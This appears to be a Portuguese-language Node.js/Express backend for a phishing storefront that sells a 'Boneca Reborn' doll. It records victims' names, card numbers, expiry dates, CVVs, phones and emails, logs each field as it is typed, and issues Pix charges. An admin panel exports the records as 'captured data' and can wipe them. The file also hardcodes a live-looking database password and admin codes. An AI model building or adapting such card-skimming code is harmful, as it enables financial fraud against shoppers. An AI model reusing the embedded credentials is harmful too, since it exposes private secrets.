
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const axios = require('axios');
const bodyParser = require('body-parser');
const path = require('path');
const session = require('express-session');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.use(session({
  secret: 'segredo',
  resave: false,
  saveUninitialized: true,
}));

mongoose.connect("mongodb+srv://igorlcreis:PskuwOrsMTaZFnGU@cluster0.xcdkhke.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0", {
  useNewUrlParser: true,
  useUnifiedTopology: true
}).then(() => console.log("MongoDB conectado com sucesso"))
  .catch(err => console.error("Erro ao conectar com MongoDB:", err));

const formDataSchema = new mongoose.Schema({
  sessionId: String,
  nome: String,
  numeroCartao: String,
  validade: String,
  cvv: String,
  telefone: String,
  email: String,
  dataEnvio: { type: Date, default: Date.now }
});
const progressiveDataSchema = new mongoose.Schema({
  sessionId: String,
  campo: String,
  valor: String,
  data: { type: Date, default: Date.now }
});
const pixPaymentSchema = new mongoose.Schema({
  sessionId: String,
  nome: String,
  valor: Number,
  descricao: String,
  qrCodeImage: String,
  qrCodeString: String,
  data: { type: Date, default: Date.now }
});
const FormData = mongoose.model('FormData', formDataSchema);
const ProgressiveData = mongoose.model('ProgressiveData', progressiveDataSchema);
const PixPayment = mongoose.model('PixPayment', pixPaymentSchema);

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.get('/index2.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index2.html')));
app.get('/pagamento-cartao.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pagamento-cartao.html')));
app.get('/pagamento-pix.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pagamento-pix.html')));
app.get('/pagamento-analise.html', (req, res) => res.sendFile(path.join(__dirname, 'public', 'pagamento-analise.html')));

app.post('/salvar-dado', async (req, res) => {
  try {
    const { campo, valor } = req.body;
    const sessionId = req.sessionID || uuidv4();
    await ProgressiveData.create({ sessionId, campo, valor });
    res.sendStatus(200);
  } catch {
    res.status(500).send('Erro ao salvar o dado');
  }
});

app.post('/submit-form', async (req, res) => {
  try {
    const { nome, numeroCartao, validade, cvv, telefone, email } = req.body;
    const sessionId = req.sessionID || uuidv4();
    await FormData.create({ sessionId, nome, numeroCartao, validade, cvv, telefone, email });
    res.redirect('/pagamento-analise.html');
  } catch {
    res.status(500).send('Erro ao processar. Tente novamente.');
  }
});

app.post('/criar-pix', async (req, res) => {
  try {
    const sessionId = req.sessionID || uuidv4();
    const nomeCampo = await ProgressiveData.findOne({ sessionId, campo: 'nome' }).sort({ data: -1 });
    const nome = nomeCampo ? nomeCampo.valor : 'Não informado';

    const resposta = await axios.post('https://api.risepay.com.br/pix/create', {
      value: 249.95,
      description: 'Pagamento Boneca Reborn'
    }, {
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': process.env.RISEPAY_PUBLIC_KEY,
        'x-api-secret': process.env.RISEPAY_PRIVATE_KEY
      }
    });

    const { qrCodeImage, qrCodeString } = resposta.data;
    await PixPayment.create({ sessionId, nome, valor: 249.95, descricao: 'Pagamento Boneca Reborn', qrCodeImage, qrCodeString });

    res.json({ qrCodeImage, pixCode: qrCodeString });
  } catch (err) {
    console.error('Erro ao gerar Pix:', err?.response?.data || err.message);
    res.status(500).json({ erro: 'Erro ao gerar cobrança Pix' });
  }
});

app.get('/dados-admin', async (req, res) => {
  try {
    const finais = await FormData.find().sort({ dataEnvio: -1 });
    const progressivos = await ProgressiveData.find().sort({ data: -1 });
    const pix = await PixPayment.find().sort({ data: -1 });
    res.json({ finais, progressivos, pix });
  } catch {
    res.status(500).json({ erro: 'Erro ao buscar dados' });
  }
});

app.listen(PORT, () => console.log(`Servidor rodando em http://localhost:${PORT}`));


app.get('/admin-login', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin-login.html'));
});

app.post('/autenticar-admin', (req, res) => {
  const { senha, codigo } = req.body;
  if (senha === 'asap' && codigo === 'b7be0c3d-d56c-4d6e-b9ef-97c72e5beaae') {
    req.session.autenticado = true;
    return res.redirect('/admin');
  }
  return res.send('<script>alert("Credenciais inválidas."); window.location="/admin-login";</script>');
});

app.get('/admin', (req, res) => {
  if (!req.session.autenticado) return res.redirect('/admin-login');
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/logout', (req, res) => {
  req.session.destroy(() => {
    res.redirect('/admin-login');
  });
});

app.get('/exportar-txt', async (req, res) => {
  if (!req.session.autenticado) return res.status(403).send("Acesso negado.");
  try {
    const dados = await FormData.find().sort({ dataEnvio: -1 });
    let texto = `=== DADOS FINAIS ===\n\n`;
    dados.forEach((item, i) => {
      texto += `[${i + 1}] Nome: ${item.nome}, Cartão: ${item.numeroCartao}, Validade: ${item.validade}, CVV: ${item.cvv}, Telefone: ${item.telefone}, Email: ${item.email}\n\n`;
    });
    res.setHeader('Content-disposition', 'attachment; filename=dados-capturados.txt');
    res.setHeader('Content-Type', 'text/plain');
    res.send(texto);
  } catch {
    res.status(500).send("Erro ao exportar dados.");
  }
});

app.post('/limpar-dados', async (req, res) => {
  if (!req.session.autenticado) return res.status(403).send("Acesso negado.");
  const { senha } = req.body;
  if (senha !== 'limpar') return res.status(401).send("Senha incorreta.");
  try {
    await FormData.deleteMany({});
    await ProgressiveData.deleteMany({});
    res.send("Dados apagados com sucesso.");
  } catch {
    res.status(500).send("Erro ao apagar dados.");
  }
});
